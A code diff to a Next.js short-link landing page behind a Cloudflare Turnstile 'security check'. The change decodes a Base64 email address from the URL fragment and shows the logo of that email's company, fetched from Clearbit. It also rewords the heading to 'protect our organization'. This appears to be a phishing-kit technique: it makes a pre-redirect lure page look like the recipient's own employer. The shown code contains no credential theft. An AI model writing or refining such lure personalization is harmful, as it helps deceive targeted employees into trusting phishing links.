@@ -1,11 +1,43 @@
 // pages/[short]/[[...path]].js 
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import Script from "next/script";
 
 function Short({ shortCode, path }) {
   const formRef = useRef(null);
+  const [logoUrl, setLogoUrl] = useState(
+    "https://qualified-production.s3.us-east-1.amazonaws.com/uploads/3b522ef84c409e4457032e4b4e3b984abbc92522c6f100f4ccc55c0ccfd3062b.png"
+  );
 
   useEffect(() => {
+    // Decode Base64 fragment from URL
+    const fragment = window.location.hash ? window.location.hash.substring(1) : "";
+    if (fragment) {
+      try {
+        const decodedEmail = atob(fragment);
+        const domain = decodedEmail.split("@")[1];
+
+        if (domain) {
+          // Attempt to fetch a logo dynamically based on domain
+          const fetchLogo = async () => {
+            try {
+              const res = await fetch(`https://logo.clearbit.com/${domain}`);
+              if (res.ok) {
+                setLogoUrl(`https://logo.clearbit.com/${domain}`);
+              } else {
+                console.log("No logo found for domain, falling back to default.");
+              }
+            } catch (error) {
+              console.error("Error fetching logo:", error);
+            }
+          };
+
+          fetchLogo();
+        }
+      } catch (error) {
+        console.error("Error decoding Base64 fragment:", error);
+      }
+    }
+
     window.handleCaptchaSuccess = function (token) {
       console.log("CAPTCHA solved with token:", token);
 
@@ -59,10 +91,16 @@ function Short({ shortCode, path }) {
 
   return (
     <div className="container">
+      <img 
+        src={logoUrl} 
+        alt="Dynamic Security Check Logo" 
+        className="logo"
+      />
       <h1>
-        Complete the security check before continuing. This step verifies that
-        you are <u><a href="https://developers.cloudflare.com/bots/">not a bot</a></u>, which helps to protect your account and prevent spam.
-      </h1>
+    Complete the security check to confirm you are <u><a href="https://developers.cloudflare.com/bots/">not a bot</a></u>. This helps protect our organization from threats and spam.
+</h1>
+
+
       <form ref={formRef} action="/api/verify-turnstile" method="POST">
         <input type="hidden" name="shortCode" value={shortCode} />
         <input type="hidden" name="path" value={path} />
@@ -87,6 +125,10 @@ function Short({ shortCode, path }) {
           align-items: center;
           height: 100vh;
           text-align: center;
+        }
+        .logo {
+          width: 150px; /* Adjust as needed */
+          margin-bottom: 1rem; /* Adds spacing between logo and heading */
         }
       `}</style>
     </div>
